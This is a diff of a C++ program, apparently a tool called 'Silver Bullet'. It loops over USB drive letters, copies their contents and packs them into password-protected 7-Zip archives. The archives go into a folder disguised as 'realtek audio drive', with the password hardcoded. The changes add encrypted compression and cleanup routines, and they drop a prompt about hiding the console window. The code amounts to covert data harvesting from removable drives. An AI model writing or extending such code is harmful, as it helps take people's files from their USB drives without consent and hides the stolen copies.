@@ -8,11 +8,10 @@
 #include <vector>
 #include <fileio.h>
 #include <size.h>
-#include <compressor.h>
-#include <ctime>
 #include <direct.h>
 #include <algorithm>
-
+#include <gc.h>
+using namespace std;
 int main()
 {
 	
@@ -37,10 +36,13 @@ int main()
 	string transpath = exepath + "\\temp\\";
 	string zippath = exepath + "\\realtek audio drive\\";
 	string recordfile = exepath + "\\serialnum.txt";
-	string compressorPath = exepath + "\\7zip";
+	string compressorPath = exepath + "\\7zip\\7z.exe";
+	string password = "HowTimeFlies";
 	
 	//对模式进行判断
+	
 	if (comparison == "debug") {        //测试模式
+		
 		cout << "debug start" << endl << endl;
 		//测试exe路径是否能够正常识别，及路径是否正确设置
 		cout << exepath << transpath << zippath << recordfile;
@@ -100,27 +102,33 @@ int main()
 		ctime_s(buff1, sizeof buff1, &current1);
 		string buff1_str = buff1;
 		cout << "system time is \t" << buff1 << endl;
-		/*
-		//去除string中不适合用于文件名的非法字符
+		
+		//9.去除string中不适合用于文件名的非法字符
 		string test3 = zippath + "GC " + buff1;
 		test3.erase(remove(test3.begin(), test3.end(), '\n'), test3.end());
 		test3.erase(remove(test3.begin(), test3.end(), '\t'), test3.end());
 		test3.erase(remove(test3.begin(), test3.end(), '\0'), test3.end());
 		cout << test3;
 		cout << "123" << endl;
-		*/
+		
+		//10.测试压缩模块是否有故障
+		cout << "testing compressing model" << endl;
+		cout << "compressor existence" << exist_test(compressorPath) << endl;
+		compress(compressorPath , "D:\\" , exepath + "\\testcompress" ,password);
+		GarbageCollection(exepath, transpath, zippath, password);
+		cout << "compressing model test done" << endl;
 		system("pause");
 	}
 	else if (comparison == "normal") {        //工作模式
-		cout << "press space to hide the command window (silent mode)\n" << endl;
-		cout << "five seconds to decide" << endl;
 		int i;
+		GarbageCollection(exepath , transpath,zippath ,password);
 		while (TRUE) {                      //进入检测与复制的死循环
 			for (i = 0; i <= 3; i++) {      //进入依次对三个U盘盘符进行复制的循环
 				//检测磁盘是否占用过大
-				if (volumesize((char*)"E:\\") >= 150 * 1024 * 1024) {
-					cout << "E:\\" << "left space is too low" << endl;
+				if (volumesize((char*)"D:\\") >= 80 * 1024 * 1024) {
+					cout << "D:\\" << "left space is too low" << endl;
 					cout << "copy process is being hung" << endl;
+					GarbageCollection(exepath, transpath, zippath, password);
 					Sleep(60000);
 					break;
 				}
@@ -215,26 +223,15 @@ int main()
 			break;
 		}
 	}
-	else if (comparison == "garbagecollection") {
-		if (volumesize((char*)"E:\\") >= 90 * 1024 * 1024) {
-			DeleteAllFile((char*)transpath.c_str());
-			exit(0);
-		}
-		time_t current = time(&current);
-		char buff[26];
-		ctime_s(buff, sizeof buff, &current);
-		string buff_str = buff;
-		string filename2 = zippath +"GC " + buff_str + ".7z";
-		filename2.erase(remove(filename2.begin(), filename2.end(), '\n'), filename2.end());
-		filename2.erase(remove(filename2.begin(), filename2.end(), '\t'), filename2.end());
-		filename2.erase(remove(filename2.begin(), filename2.end(), '\0'), filename2.end());
-		compress(exepath, transpath, filename2);
-		string remakedir = "mkdir " + transpath;
-		system((char*)remakedir.c_str());
-	}
 	else if (comparison == "compress") {
-		//调用7zip进行加密和压缩
-		compressAllDir(exepath, transpath,zippath);
+		GarbageCollection(exepath, transpath, zippath, password);
+		cout << "compressing work done" << endl;
+		DeleteAFile(recordfile.c_str());
+	}
+	else if (comparison == "hello") {
+		cout << "Nice to meet you." << endl;
+		cout << "Version : Silver Bullet 2.0.0 build 20210117 0:41" << endl;
+		system("pause");
 	}
 	else {
 		cout << "illegal input.\nProgram will exit after 5 seconds.";
